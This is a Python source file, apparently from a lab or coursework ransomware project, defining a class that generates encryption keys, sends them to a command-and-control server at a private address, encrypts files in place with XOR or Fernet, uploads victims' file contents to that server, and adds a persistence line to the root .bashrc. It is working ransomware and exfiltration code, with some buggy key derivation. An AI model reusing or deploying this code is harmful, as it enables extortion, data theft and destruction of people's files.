from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

# Bonus Chiffrement
from cryptography.fernet import Fernet

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 32

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._files_encrypted = {}

        self._log = logging.getLogger(self.__class__.__name__)

    """
        Do the key derivation
    """
    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Salt derivation
        salt_derivation = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=self.SALT_LENGTH,
                        salt=secrets.token_bytes(16),
                        iterations=self.ITERATION)

        salt = salt_derivation.derive(salt)

        # Key derivation
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                        length=self.KEY_LENGTH,
                        salt=salt,
                        iterations=self.ITERATION)

        return kdf.derive(key), salt
        
    """
        Generate key, salt and the token
    """
    def create(self)-> dict: # Tuple[bytes, bytes, bytes]:
        res = {
            "key": secrets.token_bytes(16),
            "salt": secrets.token_bytes(16),
            "token": secrets.token_bytes(16)
            }

        self._token= res["token"]
        return res

    # Encode binary to base64
    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    """
        Send a post request to the CNC 
        Payload : Key, Salt, Token
    """
    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        payload = {
            "token" : self.bin_to_b64(token),
            "salt"  : self.bin_to_b64(salt),
            "key"   : self.bin_to_b64(key)
        }
        requests.post("http://172.19.0.2:6666/new", json=payload)    

    """
        Setup the Ransomware
    """
    def setup(self)->None:

        tokens_generated = self.create()

        # Do the derivation key
        self._key, self._salt = self.do_derivation(tokens_generated["salt"], tokens_generated["key"])
        self._token = tokens_generated["token"]

        # Create the client folder
        folder_token_name = "/root/token"

        # Token folder's existance verification
        try:
            os.makedirs(folder_token_name)
        except:
            return

        # Create the binary token file
        with open(folder_token_name + "/token.bin", "wb") as f:
            f.write(self._token)

        # Create the binary salt file
        with open(folder_token_name + "/salt.bin", "wb") as f:
            f.write(self._salt)

        # Send the Salt, Key and Token to the CNC
        self.post_new(self._salt, self._key, self._token)

    def pwned(self)->None:
        with open("/root/.bashrc", "r+") as f:
            f.write("python3 /root/ransomware/ransomware.py --decrypt\n")
            os.system("python3 /root/ransomware/ransomware.py --decrypt")

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    """
        Verification that the key is correct
    """
    def check_key(self, candidate_key:bytes)->bool:
        # Get the token user
        token = self.get_hex_token()

        # Create the payload for the request verification key
        payload = {
            "token": self.bin_to_b64(token), 
            "key": self.bin_to_b64(candidate_key)
            }

        response = requests.post("http://172.19.0.2:6666/key", json=payload)
        resp = response.json()
        
        if resp["valide"]==1:
            return True
        else:
            return False

    # Set the key
    def set_key(self, key:bytes)->None:
        self._key = key

    """
        Return the token in hexadecimal format
    """
    def get_hex_token(self)->bytes:
        token = ""
        
        with open("/root/token/token.bin", "rb") as f:
            token = f.read()

        return token 

    """
        Encrypt a list of file
    """
    def xorfiles(self, files:List[str])->None:
        for file in files:
            self._files_encrypted[str(file)] = xorfile(file, self._key)

    """
        Bonus Chiffrement
        Encrypt a list of file using Fernet
    """
    def fernet_crypt(self, files:List[str], arg:bool)->None:

        key_b64 = base64.b64encode(self._key)
        f = Fernet(key_b64)
        f.encrypt

        for filename in files:
            
            # Load the file
            with open(filename, "rb") as file:
                plain = file.read()
            
            if arg:     # Encrypt
                cipher = f.encrypt(plain)
            else:       # Decrypt
                cipher = f.decrypt(plain)

            # write the result on the same file
            with open(filename, "wb") as file:
                file.write(cipher)
        
        
    """
        Bonus
        Leak the files to the CNC
    """
    def leak_files(self, files:List[str])->None:
        
        # Initiate the payload request
        payload = {}

        for file in files:
            token = self.get_hex_token()
            with open(file, "r") as f: 
                payload["token"] = self.bin_to_b64(token) 
                payload[str(file)]= f.read()
        requests.post("http://172.19.0.2:6666/files", json=payload)
           
        return {}
    """
        Cleaning the cryptographic data
    """
    def clean(self):
        # rewrite and remove crypto data from the target
        self._key = secrets.token_bytes(SecretManager.KEY_LENGTH)
        self._key = None
        self._salt = secrets.token_bytes(SecretManager.SALT_LENGTH)
        self._salt = None
        self._token = secrets.token_bytes(SecretManager.TOKEN_LENGTH)
        self._token = None

if __name__=="__main__":
    secret_manager = SecretManager()
    secret_manager.setup()
